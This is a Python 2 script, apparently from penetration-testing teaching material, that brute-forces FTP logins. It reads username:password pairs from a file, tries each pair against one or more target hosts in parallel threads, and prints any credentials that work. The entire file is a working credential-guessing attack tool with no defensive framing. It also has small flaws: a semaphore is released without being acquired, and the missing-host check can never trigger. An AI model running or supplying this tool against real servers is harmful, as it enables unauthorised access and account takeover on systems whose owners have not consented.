import optparse
import ftplib
from threading import *
from socket import *

screenlock = Semaphore(value=1)

def bruteLogin(hostname, passwdFile):
	pf = open(passwdFile, 'r')
	for line in pf.readlines():
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\r').strip('\n')
		print '[*] Trying ' + userName + '/' + passWord
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(userName, passWord)
			screenlock.acquire()
			print '\n[*] Login Succeeded for' +\
				str(hostname)+ " " + userName + "/" + passWord
			ftp.quit()
			exit(0)
		
		except Exception, e:
			pass
		
		finally:
			screenlock.release()
			
	print '[-] Brute force attempt unsuccessful'
	return (None, None)

def main():
	parser = optparse.OptionParser('usage %prog '+\
		'-H <target host> -F <password file>')
	parser.add_option('-H', dest="tgtHost", type="string", \
		help='specify target hosts separated by a comma')
	parser.add_option('-F', dest="passwdFile", type="string", \
		help='specify target password file')
	
	(options, args) = parser.parse_args()
	tgtHosts = str(options.tgtHost).split(',')
	passwdFile = options.passwdFile

	if (tgtHosts[0] == None) | (passwdFile == None):
		print '[!] You must specify a target host(s) and password file.'
		print parser.usage
		exit(0)

	else:
		setdefaulttimeout(1)
		for host in tgtHosts:
			t = Thread(target=bruteLogin, args=(host, passwdFile))
			t.start()

		
if __name__ == '__main__':
	main()

